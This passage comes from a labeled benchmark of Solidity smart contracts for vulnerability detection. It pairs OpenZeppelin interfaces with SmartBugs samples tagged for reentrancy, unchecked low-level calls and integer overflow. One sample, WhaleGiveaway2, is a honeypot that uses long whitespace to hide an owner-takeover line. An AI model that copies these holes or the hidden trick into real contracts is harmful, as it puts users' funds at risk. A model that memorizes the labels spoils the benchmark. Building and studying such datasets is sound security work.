    "contract_code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.4.0) (interfaces/IERC777.sol)\n\npragma solidity >=0.5.0;\n\n/**\n * @dev Interface of the ERC-777 Token standard as defined in the ERC.\n *\n * This contract uses the\n * https://eips.ethereum.org/EIPS/eip-1820[ERC-1820 registry standard] to let\n * token holders and recipients react to token movements by using setting implementers\n * for the associated interfaces in said registry. See {IERC1820Registry} and\n * {IERC1820Implementer}.\n */\ninterface IERC777 {\n    /**\n     * @dev Emitted when `amount` tokens are created by `operator` and assigned to `to`.\n     *\n     * Note that some additional user `data` and `operatorData` can be logged in the event.\n     */\n    event Minted(address indexed operator, address indexed to, uint256 amount, bytes data, bytes operatorData);\n\n    /**\n     * @dev Emitted when `operator` destroys `amount` tokens from `account`.\n     *\n     * Note that some additional user `data` and `operatorData` can be logged in the event.\n     */\n    event Burned(address indexed operator, address indexed from, uint256 amount, bytes data, bytes operatorData);\n\n    /**\n     * @dev Emitted when `operator` is made operator for `tokenHolder`.\n     */\n    event AuthorizedOperator(address indexed operator, address indexed tokenHolder);\n\n    /**\n     * @dev Emitted when `operator` is revoked its operator status for `tokenHolder`.\n     */\n    event RevokedOperator(address indexed operator, address indexed tokenHolder);\n\n    /**\n     * @dev Returns the name of the token.\n     */\n    function name() external view returns (string memory);\n\n    /**\n     * @dev Returns the symbol of the token, usually a shorter version of the\n     * name.\n     */\n    function symbol() external view returns (string memory);\n\n    /**\n     * @dev Returns the smallest part of the token that is not divisible. This\n     * means all token operations (creation, movement and destruction) must have\n     * amounts that are a multiple of this number.\n     *\n     * For most token contracts, this value will equal 1.\n     */\n    function granularity() external view returns (uint256);\n\n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply() external view returns (uint256);\n\n    /**\n     * @dev Returns the amount of tokens owned by an account (`owner`).\n     */\n    function balanceOf(address owner) external view returns (uint256);\n\n    /**\n     * @dev Moves `amount` tokens from the caller's account to `recipient`.\n     *\n     * If send or receive hooks are registered for the caller and `recipient`,\n     * the corresponding functions will be called with `data` and empty\n     * `operatorData`. See {IERC777Sender} and {IERC777Recipient}.\n     *\n     * Emits a {Sent} event.\n     *\n     * Requirements\n     *\n     * - the caller must have at least `amount` tokens.\n     * - `recipient` cannot be the zero address.\n     * - if `recipient` is a contract, it must implement the {IERC777Recipient}\n     * interface.\n     */\n    function send(address recipient, uint256 amount, bytes calldata data) external;\n\n    /**\n     * @dev Destroys `amount` tokens from the caller's account, reducing the\n     * total supply.\n     *\n     * If a send hook is registered for the caller, the corresponding function\n     * will be called with `data` and empty `operatorData`. See {IERC777Sender}.\n     *\n     * Emits a {Burned} event.\n     *\n     * Requirements\n     *\n     * - the caller must have at least `amount` tokens.\n     */\n    function burn(uint256 amount, bytes calldata data) external;\n\n    /**\n     * @dev Returns true if an account is an operator of `tokenHolder`.\n     * Operators can send and burn tokens on behalf of their owners. All\n     * accounts are their own operator.\n     *\n     * See {operatorSend} and {operatorBurn}.\n     */\n    function isOperatorFor(address operator, address tokenHolder) external view returns (bool);\n\n    /**\n     * @dev Make an account an operator of the caller.\n     *\n     * See {isOperatorFor}.\n     *\n     * Emits an {AuthorizedOperator} event.\n     *\n     * Requirements\n     *\n     * - `operator` cannot be calling address.\n     */\n    function authorizeOperator(address operator) external;\n\n    /**\n     * @dev Revoke an account's operator status for the caller.\n     *\n     * See {isOperatorFor} and {defaultOperators}.\n     *\n     * Emits a {RevokedOperator} event.\n     *\n     * Requirements\n     *\n     * - `operator` cannot be calling address.\n     */\n    function revokeOperator(address operator) external;\n\n    /**\n     * @dev Returns the list of default operators. These accounts are operators\n     * for all token holders, even if {authorizeOperator} was never called on\n     * them.\n     *\n     * This list is immutable, but individual holders may revoke these via\n     * {revokeOperator}, in which case {isOperatorFor} will return false.\n     */\n    function defaultOperators() external view returns (address[] memory);\n\n    /**\n     * @dev Moves `amount` tokens from `sender` to `recipient`. The caller must\n     * be an operator of `sender`.\n     *\n     * If send or receive hooks are registered for `sender` and `recipient`,\n     * the corresponding functions will be called with `data` and\n     * `operatorData`. See {IERC777Sender} and {IERC777Recipient}.\n     *\n     * Emits a {Sent} event.\n     *\n     * Requirements\n     *\n     * - `sender` cannot be the zero address.\n     * - `sender` must have at least `amount` tokens.\n     * - the caller must be an operator for `sender`.\n     * - `recipient` cannot be the zero address.\n     * - if `recipient` is a contract, it must implement the {IERC777Recipient}\n     * interface.\n     */\n    function operatorSend(\n        address sender,\n        address recipient,\n        uint256 amount,\n        bytes calldata data,\n        bytes calldata operatorData\n    ) external;\n\n    /**\n     * @dev Destroys `amount` tokens from `account`, reducing the total supply.\n     * The caller must be an operator of `account`.\n     *\n     * If a send hook is registered for `account`, the corresponding function\n     * will be called with `data` and `operatorData`. See {IERC777Sender}.\n     *\n     * Emits a {Burned} event.\n     *\n     * Requirements\n     *\n     * - `account` cannot be the zero address.\n     * - `account` must have at least `amount` tokens.\n     * - the caller must be an operator for `account`.\n     */\n    function operatorBurn(address account, uint256 amount, bytes calldata data, bytes calldata operatorData) external;\n\n    event Sent(\n        address indexed operator,\n        address indexed from,\n        address indexed to,\n        uint256 amount,\n        bytes data,\n        bytes operatorData\n    );\n}\n",
    "num_lines": 201,
    "vulnerability_type": "none",
    "ground_truth_vulnerabilities": [],
    "is_vulnerable": false,
    "source": "openzeppelin"
  },
  {
    "contract_name": "0x4e73b32ed6c35f570686b89848e5f39f20ecc106",
    "contract_path": "data/raw/smartbugs-curated/dataset/reentrancy/0x4e73b32ed6c35f570686b89848e5f39f20ecc106.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 54\n */\n\npragma solidity ^0.4.19;\n\ncontract PRIVATE_ETH_CELL\n{\n    mapping (address=>uint256) public balances;   \n   \n    uint public MinSum;\n    \n    LogFile Log;\n    \n    bool intitalized;\n    \n    function SetMinSum(uint _val)\n    public\n    {\n        require(!intitalized);\n        MinSum = _val;\n    }\n    \n    function SetLogFile(address _log)\n    public\n    {\n        require(!intitalized);\n        Log = LogFile(_log);\n    }\n    \n    function Initialized()\n    public\n    {\n        intitalized = true;\n    }\n    \n    function Deposit()\n    public\n    payable\n    {\n        balances[msg.sender]+= msg.value;\n        Log.AddMessage(msg.sender,msg.value,\"Put\");\n    }\n    \n    function Collect(uint _am)\n    public\n    payable\n    {\n        if(balances[msg.sender]>=MinSum && balances[msg.sender]>=_am)\n        {\n            // <yes> <report> REENTRANCY\n            if(msg.sender.call.value(_am)())\n            {\n                balances[msg.sender]-=_am;\n                Log.AddMessage(msg.sender,_am,\"Collect\");\n            }\n        }\n    }\n    \n    function() \n    public \n    payable\n    {\n        Deposit();\n    }\n    \n}\n\n\n\ncontract LogFile\n{\n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n    \n    Message[] public History;\n    \n    Message LastMsg;\n    \n    function AddMessage(address _adr,uint _val,string _data)\n    public\n    {\n        LastMsg.Sender = _adr;\n        LastMsg.Time = now;\n        LastMsg.Val = _val;\n        LastMsg.Data = _data;\n        History.push(LastMsg);\n    }\n}",
    "num_lines": 96,
    "vulnerability_type": "reentrancy",
    "ground_truth_vulnerabilities": [
      "reentrancy"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "0x39cfd754c85023648bf003bea2dd498c5612abfa",
    "contract_path": "data/raw/smartbugs-curated/dataset/unchecked_low_level_calls/0x39cfd754c85023648bf003bea2dd498c5612abfa.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 44,97\n */\n\npragma solidity ^0.4.18;\n\ncontract Ownable\n{\n    address newOwner;\n    address owner = msg.sender;\n    \n    function changeOwner(address addr)\n    public\n    onlyOwner\n    {\n        newOwner = addr;\n    }\n    \n    function confirmOwner() \n    public\n    {\n        if(msg.sender==newOwner)\n        {\n            owner=newOwner;\n        }\n    }\n    \n    modifier onlyOwner\n    {\n        if(owner == msg.sender)_;\n    }\n}\n\ncontract Token is Ownable\n{\n    address owner = msg.sender;\n    function WithdrawToken(address token, uint256 amount,address to)\n    public \n    onlyOwner\n    {\n        // <yes> <report> UNCHECKED_LL_CALLS\n        token.call(bytes4(sha3(\"transfer(address,uint256)\")),to,amount); \n    }\n}\n\ncontract TokenBank is Token\n{\n    uint public MinDeposit;\n    mapping (address => uint) public Holders;\n    \n     ///Constructor\n    function initTokenBank()\n    public\n    {\n        owner = msg.sender;\n        MinDeposit = 1 ether;\n    }\n    \n    function()\n    payable\n    {\n        Deposit();\n    }\n   \n    function Deposit() \n    payable\n    {\n        if(msg.value>MinDeposit)\n        {\n            Holders[msg.sender]+=msg.value;\n        }\n    }\n    \n    function WitdrawTokenToHolder(address _to,address _token,uint _amount)\n    public\n    onlyOwner\n    {\n        if(Holders[_to]>0)\n        {\n            Holders[_to]=0;\n            WithdrawToken(_token,_amount,_to);     \n        }\n    }\n   \n    function WithdrawToHolder(address _addr, uint _wei) \n    public\n    onlyOwner\n    payable\n    {\n        if(Holders[msg.sender]>0)\n        {\n            if(Holders[_addr]>=_wei)\n            {\n                // <yes> <report> UNCHECKED_LL_CALLS\n                _addr.call.value(_wei);\n                Holders[_addr]-=_wei;\n            }\n        }\n    }\n    \n \n}",
    "num_lines": 104,
    "vulnerability_type": "unchecked_low_level_calls",
    "ground_truth_vulnerabilities": [
      "unchecked_low_level_calls"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "0xb11b2fed6c9354f7aa2f658d3b4d7b31d8a13b77",
    "contract_path": "data/raw/smartbugs-curated/dataset/unchecked_low_level_calls/0xb11b2fed6c9354f7aa2f658d3b4d7b31d8a13b77.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 14\n */\n\npragma solidity ^0.4.24;\n\ncontract Proxy  {\n    modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender;\n    function transferOwner(address _owner) public onlyOwner { Owner = _owner; } \n    function proxy(address target, bytes data) public payable {\n        // <yes> <report> UNCHECKED_LL_CALLS\n        target.call.value(msg.value)(data);\n    }\n}\n\ncontract DepositProxy is Proxy {\n    address public Owner;\n    mapping (address => uint256) public Deposits;\n\n    function () public payable { }\n    \n    function Vault() public payable {\n        if (msg.sender == tx.origin) {\n            Owner = msg.sender;\n            deposit();\n        }\n    }\n    \n    function deposit() public payable {\n        if (msg.value > 0.5 ether) {\n            Deposits[msg.sender] += msg.value;\n        }\n    }\n    \n    function withdraw(uint256 amount) public onlyOwner {\n        if (amount>0 && Deposits[msg.sender]>=amount) {\n            msg.sender.transfer(amount);\n        }\n    }\n}",
    "num_lines": 42,
    "vulnerability_type": "unchecked_low_level_calls",
    "ground_truth_vulnerabilities": [
      "unchecked_low_level_calls"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "0x5aa88d2901c68fda244f1d0584400368d2c8e739",
    "contract_path": "data/raw/smartbugs-curated/dataset/unchecked_low_level_calls/0x5aa88d2901c68fda244f1d0584400368d2c8e739.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 29\n */\n\npragma solidity ^0.4.18;\n\ncontract MultiplicatorX3\n{\n    address public Owner = msg.sender;\n   \n    function() public payable{}\n   \n    function withdraw()\n    payable\n    public\n    {\n        require(msg.sender == Owner);\n        Owner.transfer(this.balance);\n    }\n    \n    function Command(address adr,bytes data)\n    payable\n    public\n    {\n        require(msg.sender == Owner);\n        // <yes> <report> UNCHECKED_LL_CALLS\n        adr.call.value(msg.value)(data);\n    }\n    \n    function multiplicate(address adr)\n    public\n    payable\n    {\n        if(msg.value>=this.balance)\n        {        \n            adr.transfer(this.balance+msg.value);\n        }\n    }\n}",
    "num_lines": 41,
    "vulnerability_type": "unchecked_low_level_calls",
    "ground_truth_vulnerabilities": [
      "unchecked_low_level_calls"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "0x3f2ef511aa6e75231e4deafc7a3d2ecab3741de2",
    "contract_path": "data/raw/smartbugs-curated/dataset/unchecked_low_level_calls/0x3f2ef511aa6e75231e4deafc7a3d2ecab3741de2.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 45\n */\n\npragma solidity ^0.4.19;\n\ncontract WhaleGiveaway2\n{\n    address public Owner = msg.sender;\n    uint constant public minEligibility = 0.999001 ether; \n   \n    function()\n    public\n    payable\n    {\n        \n    }\n   \n    function redeem()\n    public\n    payable\n    {                                                                    \n        if(msg.value>=minEligibility)\n        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Owner.transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           \n            msg.sender.transfer(this.balance);\n        }                                                                                                                \n    }\n    \n    function withdraw()\n    payable\n    public\n    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){Owner=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  \n        require(msg.sender == Owner);\n        Owner.transfer(this.balance);\n    }\n    \n    function Command(address adr,bytes data)\n    payable\n    public\n    {\n        require(msg.sender == Owner);\n        // <yes> <report> UNCHECKED_LL_CALLS\n        adr.call.value(msg.value)(data);\n    }\n}",
    "num_lines": 47,
    "vulnerability_type": "unchecked_low_level_calls",
    "ground_truth_vulnerabilities": [
      "unchecked_low_level_calls"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "timelock",
    "contract_path": "data/raw/smartbugs-curated/dataset/arithmetic/timelock.sol",
    "contract_code": "/*\n * @source: https://github.com/sigp/solidity-security-blog\n * @author: -\n * @vulnerable_at_lines: 22\n */\n\n//added pragma version\n pragma solidity ^0.4.10;\n \n contract TimeLock {\n\n     mapping(address => uint) public balances;\n     mapping(address => uint) public lockTime;\n\n     function deposit() public payable {\n         balances[msg.sender] += msg.value;\n         lockTime[msg.sender] = now + 1 weeks;\n     }\n\n     function increaseLockTime(uint _secondsToIncrease) public {\n         // <yes> <report> ARITHMETIC\n         lockTime[msg.sender] += _secondsToIncrease;\n     }\n\n     function withdraw() public {\n         require(balances[msg.sender] > 0);\n         require(now > lockTime[msg.sender]);\n         uint transferValue = balances[msg.sender];\n         balances[msg.sender] = 0;\n         msg.sender.transfer(transferValue);\n     }\n }\n",
    "num_lines": 33,
    "vulnerability_type": "integer_overflow",
    "ground_truth_vulnerabilities": [
      "integer_overflow"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "Votes",
    "contract_path": "data/raw/openzeppelin-contracts/contracts/governance/utils/Votes.sol",
    "contract_code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.5.0) (governance/utils/Votes.sol)\n\npragma solidity ^0.8.24;\n\nimport {IERC5805} from \"../../interfaces/IERC5805.sol\";\nimport {Context} from \"../../utils/Context.sol\";\nimport {Nonces} from \"../../utils/Nonces.sol\";\nimport {EIP712} from \"../../utils/cryptography/EIP712.sol\";\nimport {Checkpoints} from \"../../utils/structs/Checkpoints.sol\";\nimport {SafeCast} from \"../../utils/math/SafeCast.sol\";\nimport {ECDSA} from \"../../utils/cryptography/ECDSA.sol\";\nimport {Time} from \"../../utils/types/Time.sol\";\n\n/**\n * @dev This is a base abstract contract that tracks voting units, which are a measure of voting power that can be\n * transferred, and provides a system of vote delegation, where an account can delegate its voting units to a sort of\n * \"representative\" that will pool delegated voting units from different accounts and can then use it to vote in\n * decisions. In fact, voting units _must_ be delegated in order to count as actual votes, and an account has to\n * delegate those votes to itself if it wishes to participate in decisions and does not have a trusted representative.\n *\n * This contract is often combined with a token contract such that voting units correspond to token units. For an\n * example, see {ERC721Votes}.\n *\n * The full history of delegate votes is tracked on-chain so that governance protocols can consider votes as distributed\n * at a particular block number to protect against flash loans and double voting. The opt-in delegate system makes the\n * cost of this history tracking optional.\n *\n * When using this module the derived contract must implement {_getVotingUnits} (for example, make it return\n * {ERC721-balanceOf}), and can use {_transferVotingUnits} to track a change in the distribution of those units (in the\n * previous example, it would be included in {ERC721-_update}).\n */\nabstract contract Votes is Context, EIP712, Nonces, IERC5805 {\n    using Checkpoints for Checkpoints.Trace208;\n\n    bytes32 private constant DELEGATION_TYPEHASH =\n        keccak256(\"Delegation(address delegatee,uint256 nonce,uint256 expiry)\");\n\n    mapping(address account => address) private _delegatee;\n\n    mapping(address delegatee => Checkpoints.Trace208) private _delegateCheckpoints;\n\n    Checkpoints.Trace208 private _totalCheckpoints;\n\n    /**\n     * @dev The clock was incorrectly modified.\n     */\n    error ERC6372InconsistentClock();\n\n    /**\n     * @dev Lookup to future votes is not available.\n     */\n    error ERC5805FutureLookup(uint256 timepoint, uint48 clock);\n\n    /**\n     * @dev Clock used for flagging checkpoints. Can be overridden to implement timestamp based\n     * checkpoints (and voting), in which case {CLOCK_MODE} should be overridden as well to match.\n     */\n    function clock() public view virtual returns (uint48) {\n        return Time.blockNumber();\n    }\n\n    /**\n     * @dev Machine-readable description of the clock as specified in ERC-6372.\n     */\n    // solhint-disable-next-line func-name-mixedcase\n    function CLOCK_MODE() public view virtual returns (string memory) {\n        // Check that the clock was not modified\n        if (clock() != Time.blockNumber()) {\n            revert ERC6372InconsistentClock();\n        }\n        return \"mode=blocknumber&from=default\";\n    }\n\n    /**\n     * @dev Validate that a timepoint is in the past, and return it as a uint48.\n     */\n    function _validateTimepoint(uint256 timepoint) internal view returns (uint48) {\n        uint48 currentTimepoint = clock();\n        if (timepoint >= currentTimepoint) revert ERC5805FutureLookup(timepoint, currentTimepoint);\n        return SafeCast.toUint48(timepoint);\n    }\n\n    /**\n     * @dev Returns the current amount of votes that `account` has.\n     */\n    function getVotes(address account) public view virtual returns (uint256) {\n        return _delegateCheckpoints[account].latest();\n    }\n\n    /**\n     * @dev Returns the amount of votes that `account` had at a specific moment in the past. If the `clock()` is\n     * configured to use block numbers, this will return the value at the end of the corresponding block.\n     *\n     * Requirements:\n     *\n     * - `timepoint` must be in the past. If operating using block numbers, the block must be already mined.\n     */\n    function getPastVotes(address account, uint256 timepoint) public view virtual returns (uint256) {\n        return _delegateCheckpoints[account].upperLookupRecent(_validateTimepoint(timepoint));\n    }\n\n    /**\n     * @dev Returns the total supply of votes available at a specific moment in the past. If the `clock()` is\n     * configured to use block numbers, this will return the value at the end of the corresponding block.\n     *\n     * NOTE: This value is the sum of all available votes, which is not necessarily the sum of all delegated votes.\n     * Votes that have not been delegated are still part of total supply, even though they would not participate in a\n     * vote.\n     *\n     * Requirements:\n     *\n     * - `timepoint` must be in the past. If operating using block numbers, the block must be already mined.\n     */\n    function getPastTotalSupply(uint256 timepoint) public view virtual returns (uint256) {\n        return _totalCheckpoints.upperLookupRecent(_validateTimepoint(timepoint));\n    }\n\n    /**\n     * @dev Returns the current total supply of votes.\n     */\n    function _getTotalSupply() internal view virtual returns (uint256) {\n        return _totalCheckpoints.latest();\n    }\n\n    /**\n     * @dev Returns the delegate that `account` has chosen.\n     */\n    function delegates(address account) public view virtual returns (address) {\n        return _delegatee[account];\n    }\n\n    /**\n     * @dev Delegates votes from the sender to `delegatee`.\n     */\n    function delegate(address delegatee) public virtual {\n        address account = _msgSender();\n        _delegate(account, delegatee);\n    }\n\n    /**\n     * @dev Delegates votes from signer to `delegatee`.\n     */\n    function delegateBySig(\n        address delegatee,\n        uint256 nonce,\n        uint256 expiry,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) public virtual {\n        if (block.timestamp > expiry) {\n            revert VotesExpiredSignature(expiry);\n        }\n        address signer = ECDSA.recover(\n            _hashTypedDataV4(keccak256(abi.encode(DELEGATION_TYPEHASH, delegatee, nonce, expiry))),\n            v,\n            r,\n            s\n        );\n        _useCheckedNonce(signer, nonce);\n        _delegate(signer, delegatee);\n    }\n\n    /**\n     * @dev Delegate all of `account`'s voting units to `delegatee`.\n     *\n     * Emits events {IVotes-DelegateChanged} and {IVotes-DelegateVotesChanged}.\n     */\n    function _delegate(address account, address delegatee) internal virtual {\n        address oldDelegate = delegates(account);\n        _delegatee[account] = delegatee;\n\n        emit DelegateChanged(account, oldDelegate, delegatee);\n        _moveDelegateVotes(oldDelegate, delegatee, _getVotingUnits(account));\n    }\n\n    /**\n     * @dev Transfers, mints, or burns voting units. To register a mint, `from` should be zero. To register a burn, `to`\n     * should be zero. Total supply of voting units will be adjusted with mints and burns.\n     */\n    function _transferVotingUnits(address from, address to, uint256 amount) internal virtual {\n        if (from == address(0)) {\n            _push(_totalCheckpoints, _add, SafeCast.toUint208(amount));\n        }\n        if (to == address(0)) {\n            _push(_totalCheckpoints, _subtract, SafeCast.toUint208(amount));\n        }\n        _moveDelegateVotes(delegates(from), delegates(to), amount);\n    }\n\n    /**\n     * @dev Moves delegated votes from one delegate to another.\n     */\n    function _moveDelegateVotes(address from, address to, uint256 amount) internal virtual {\n        if (from != to && amount > 0) {\n            if (from != address(0)) {\n                (uint256 oldValue, uint256 newValue) = _push(\n                    _delegateCheckpoints[from],\n                    _subtract,\n                    SafeCast.toUint208(amount)\n                );\n                emit DelegateVotesChanged(from, oldValue, newValue);\n            }\n            if (to != address(0)) {\n                (uint256 oldValue, uint256 newValue) = _push(\n                    _delegateCheckpoints[to],\n                    _add,\n                    SafeCast.toUint208(amount)\n                );\n                emit DelegateVotesChanged(to, oldValue, newValue);\n            }\n        }\n    }\n\n    /**\n     * @dev Get number of checkpoints for `account`.\n     */\n    function _numCheckpoints(address account) internal view virtual returns (uint32) {\n        return SafeCast.toUint32(_delegateCheckpoints[account].length());\n    }\n\n    /**\n     * @dev Get the `pos`-th checkpoint for `account`.\n     */\n    function _checkpoints(\n        address account,\n        uint32 pos\n    ) internal view virtual returns (Checkpoints.Checkpoint208 memory) {\n        return _delegateCheckpoints[account].at(pos);\n    }\n\n    function _push(\n        Checkpoints.Trace208 storage store,\n        function(uint208, uint208) view returns (uint208) op,\n        uint208 delta\n    ) private returns (uint208 oldValue, uint208 newValue) {\n        return store.push(clock(), op(store.latest(), delta));\n    }\n\n    function _add(uint208 a, uint208 b) private pure returns (uint208) {\n        return a + b;\n    }\n\n    function _subtract(uint208 a, uint208 b) private pure returns (uint208) {\n        return a - b;\n    }\n\n    /**\n     * @dev Must return the voting units held by an account.\n     */\n    function _getVotingUnits(address) internal view virtual returns (uint256);\n}\n",
    "num_lines": 254,
    "vulnerability_type": "none",
    "ground_truth_vulnerabilities": [],
    "is_vulnerable": false,
    "source": "openzeppelin"
  },
  {
    "contract_name": "reentrancy_cross_function",
    "contract_path": "data/raw/smartbugs-curated/dataset/reentrancy/reentrancy_cross_function.sol",
    "contract_code": "/*\n * @source: https://consensys.github.io/smart-contract-best-practices/known_attacks/\n * @author: consensys\n * @vulnerable_at_lines: 24\n */\n\npragma solidity ^0.4.24;\n\ncontract Reentrancy_cross_function {\n\n    // INSECURE\n    mapping (address => uint) private userBalances;\n\n    function transfer(address to, uint amount) {\n        if (userBalances[msg.sender] >= amount) {\n            userBalances[to] += amount;\n            userBalances[msg.sender] -= amount;\n        }\n    }\n\n    function withdrawBalance() public {\n        uint amountToWithdraw = userBalances[msg.sender];\n        // <yes> <report> REENTRANCY\n        (bool success, ) = msg.sender.call.value(amountToWithdraw)(\"\"); // At this point, the caller's code is executed, and can call transfer()\n        require(success);\n        userBalances[msg.sender] = 0;\n    }\n}\n",
    "num_lines": 29,
    "vulnerability_type": "reentrancy",
    "ground_truth_vulnerabilities": [
      "reentrancy"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "0xe894d54dca59cb53fe9cbc5155093605c7068220",
    "contract_path": "data/raw/smartbugs-curated/dataset/unchecked_low_level_calls/0xe894d54dca59cb53fe9cbc5155093605c7068220.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 17\n */\n\npragma solidity ^0.4.24;\n \ncontract airDrop{\n    \n    function transfer(address from,address caddress,address[] _tos,uint v, uint _decimals)public returns (bool){\n        require(_tos.length > 0);\n        bytes4 id=bytes4(keccak256(\"transferFrom(address,address,uint256)\"));\n        uint _value = v * 10 ** _decimals;\n        for(uint i=0;i<_tos.length;i++){\n            // <yes> <report> UNCHECKED_LL_CALLS\n            caddress.call(id,from,_tos[i],_value);\n        }\n        return true;\n    }\n}",
    "num_lines": 21,
    "vulnerability_type": "unchecked_low_level_calls",
    "ground_truth_vulnerabilities": [
      "unchecked_low_level_calls"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "spank_chain_payment",
    "contract_path": "data/raw/smartbugs-curated/dataset/reentrancy/spank_chain_payment.sol",
    "contract_code": "/*\n * @source: https://github.com/trailofbits/not-so-smart-contracts/blob/master/reentrancy/SpankChain_source_code/SpankChain_Payment.sol\n * @author: -\n * @vulnerable_at_lines: 426,430\n */\n\n // https://etherscan.io/address/0xf91546835f756da0c10cfa0cda95b15577b84aa7#code\n\n pragma solidity ^0.4.23;\n // produced by the Solididy File Flattener (c) David Appleton 2018\n // contact : dave@akomba.com\n // released under Apache 2.0 licence\n contract Token {\n     /* This is a slight change to the ERC20 base standard.\n     function totalSupply() constant returns (uint256 supply);\n     is replaced with:\n     uint256 public totalSupply;\n     This automatically creates a getter function for the totalSupply.\n     This is moved to the base contract since public getter functions are not\n     currently recognised as an implementation of the matching abstract\n     function by the compiler.\n     */\n     /// total amount of tokens\n     uint256 public totalSupply;\n\n     /// @param _owner The address from which the balance will be retrieved\n     /// @return The balance\n     function balanceOf(address _owner) public constant returns (uint256 balance);\n\n     /// @notice send `_value` token to `_to` from `msg.sender`\n     /// @param _to The address of the recipient\n     /// @param _value The amount of token to be transferred\n     /// @return Whether the transfer was successful or not\n     function transfer(address _to, uint256 _value) public returns (bool success);\n\n     /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n     /// @param _from The address of the sender\n     /// @param _to The address of the recipient\n     /// @param _value The amount of token to be transferred\n     /// @return Whether the transfer was successful or not\n     function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\n\n     /// @notice `msg.sender` approves `_spender` to spend `_value` tokens\n     /// @param _spender The address of the account able to transfer the tokens\n     /// @param _value The amount of tokens to be approved for transfer\n     /// @return Whether the approval was successful or not\n     function approve(address _spender, uint256 _value) public returns (bool success);\n\n     /// @param _owner The address of the account owning tokens\n     /// @param _spender The address of the account able to transfer the tokens\n     /// @return Amount of remaining tokens allowed to spent\n     function allowance(address _owner, address _spender) public constant returns (uint256 remaining);\n\n     event Transfer(address indexed _from, address indexed _to, uint256 _value);\n     event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n }\n\n library ECTools {\n\n     // @dev Recovers the address which has signed a message\n     // @thanks https://gist.github.com/axic/5b33912c6f61ae6fd96d6c4a47afde6d\n     function recoverSigner(bytes32 _hashedMsg, string _sig) public pure returns (address) {\n         require(_hashedMsg != 0x00);\n\n         // need this for test RPC\n         bytes memory prefix = \"\\x19Ethereum Signed Message:\\n32\";\n         bytes32 prefixedHash = keccak256(abi.encodePacked(prefix, _hashedMsg));\n\n         if (bytes(_sig).length != 132) {\n             return 0x0;\n         }\n         bytes32 r;\n         bytes32 s;\n         uint8 v;\n         bytes memory sig = hexstrToBytes(substring(_sig, 2, 132));\n         assembly {\n             r := mload(add(sig, 32))\n             s := mload(add(sig, 64))\n             v := byte(0, mload(add(sig, 96)))\n         }\n         if (v < 27) {\n             v += 27;\n         }\n         if (v < 27 || v > 28) {\n             return 0x0;\n         }\n         return ecrecover(prefixedHash, v, r, s);\n     }\n\n     // @dev Verifies if the message is signed by an address\n     function isSignedBy(bytes32 _hashedMsg, string _sig, address _addr) public pure returns (bool) {\n         require(_addr != 0x0);\n\n         return _addr == recoverSigner(_hashedMsg, _sig);\n     }\n\n     // @dev Converts an hexstring to bytes\n     function hexstrToBytes(string _hexstr) public pure returns (bytes) {\n         uint len = bytes(_hexstr).length;\n         require(len % 2 == 0);\n\n         bytes memory bstr = bytes(new string(len / 2));\n         uint k = 0;\n         string memory s;\n         string memory r;\n         for (uint i = 0; i < len; i += 2) {\n             s = substring(_hexstr, i, i + 1);\n             r = substring(_hexstr, i + 1, i + 2);\n             uint p = parseInt16Char(s) * 16 + parseInt16Char(r);\n             bstr[k++] = uintToBytes32(p)[31];\n         }\n         return bstr;\n     }\n\n     // @dev Parses a hexchar, like 'a', and returns its hex value, in this case 10\n     function parseInt16Char(string _char) public pure returns (uint) {\n         bytes memory bresult = bytes(_char);\n         // bool decimals = false;\n         if ((bresult[0] >= 48) && (bresult[0] <= 57)) {\n             return uint(bresult[0]) - 48;\n         } else if ((bresult[0] >= 65) && (bresult[0] <= 70)) {\n             return uint(bresult[0]) - 55;\n         } else if ((bresult[0] >= 97) && (bresult[0] <= 